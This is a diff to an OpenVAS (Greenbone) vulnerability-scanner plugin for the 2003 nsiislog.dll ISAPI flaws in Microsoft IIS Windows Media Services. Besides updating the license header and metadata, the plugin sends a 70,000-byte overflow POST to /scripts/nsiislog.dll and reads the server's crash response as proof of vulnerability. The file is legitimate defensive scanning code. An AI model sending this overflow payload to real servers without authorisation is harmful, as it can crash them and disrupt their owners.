@@ -1,40 +1,21 @@
-###############################################################################
-# OpenVAS Vulnerability Test
+# SPDX-FileCopyrightText: 2012 Greenbone AG
+# Some text descriptions might be excerpted from (a) referenced
+# source(s), and are Copyright (C) by the respective right holder(s).
 #
-# Microsoft Windows Media Services ISAPI Extension Code Execution Vulnerabilities
-#
-# Authors:
-# Rachana Shetty <srachana@secpod.com>
-#
-# Copyright:
-# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
-#
-# This program is free software; you can redistribute it and/or modify
-# it under the terms of the GNU General Public License version 2
-# (or any later version), as published by the Free Software Foundation.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
-###############################################################################
+# SPDX-License-Identifier: GPL-2.0-only
 
 CPE = "cpe:/a:microsoft:internet_information_services";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802897");
-  script_version("2022-12-05T10:11:03+0000");
+  script_version("2023-10-10T05:05:41+0000");
   script_cve_id("CVE-2003-0227", "CVE-2003-0349");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
+  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
   script_tag(name:"creation_date", value:"2012-07-25 16:04:16 +0530 (Wed, 25 Jul 2012)");
-  script_name("Microsoft Windows Media Services ISAPI Extension Code Execution Vulnerabilities");
+  script_name("Microsoft Windows Media Services ISAPI Extension Code Execution Vulnerabilities - Active Check");
   script_xref(name:"URL", value:"http://secunia.com/advisories/9115");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/7727");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/8035");
@@ -45,10 +26,10 @@ if(description)
   script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-022");
   script_xref(name:"URL", value:"http://support.microsoft.com/default.aspx?scid=kb;en-us;822343");
   script_category(ACT_DENIAL);
-  script_tag(name:"qod_type", value:"remote_active");
-  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
+  script_tag(name:"qod_type", value:"remote_analysis");
+  script_copyright("Copyright (C) 2012 Greenbone AG");
   script_family("Web Servers");
-  script_dependencies("secpod_ms_iis_detect.nasl");
+  script_dependencies("gb_microsoft_iis_http_detect.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("IIS/installed");
 
@@ -85,25 +66,26 @@ if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
   exit(0);
 
 url = "/scripts/nsiislog.dll";
-iisreq = http_get(item: url, port: port);
-iisres = http_keepalive_send_recv(port:port, data:iisreq, bodyonly:FALSE);
+req = http_get(item: url, port: port);
+res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-if(!iisres || ">NetShow ISAPI Log Dll" >!< iisres)
+if(!res || ">NetShow ISAPI Log Dll" >!< res)
   exit(0);
 
 postData = crap(data:"A", length:70000);
 
 host = http_host_name(port:port);
 
-iisreq = string("POST ", url, " HTTP/1.1\r\n",
-                "Host: ", host, "\r\n",
-                "Content-Length: ", strlen(postData),
-                "\r\n\r\n", postData);
-iisres = http_send_recv(port:port, data:iisreq);
+req = string("POST ", url, " HTTP/1.1\r\n",
+             "Host: ", host, "\r\n",
+             "Content-Length: ", strlen(postData),
+             "\r\n\r\n", postData);
+res = http_send_recv(port:port, data:req);
 
-if(iisres && "HTTP/1.1 500 Server Error" >< iisres &&
-   "The remote procedure call failed" >< iisres && "<title>Error" >< iisres) {
-  security_message(port:port);
+if(res && res =~ "^HTTP/1\.[01] 500" &&
+   "The remote procedure call failed" >< res && "<title>Error" >< res) {
+  report = http_report_vuln_url(port:port, url:url);
+  security_message(port:port, data:report);
   exit(0);
 }
 
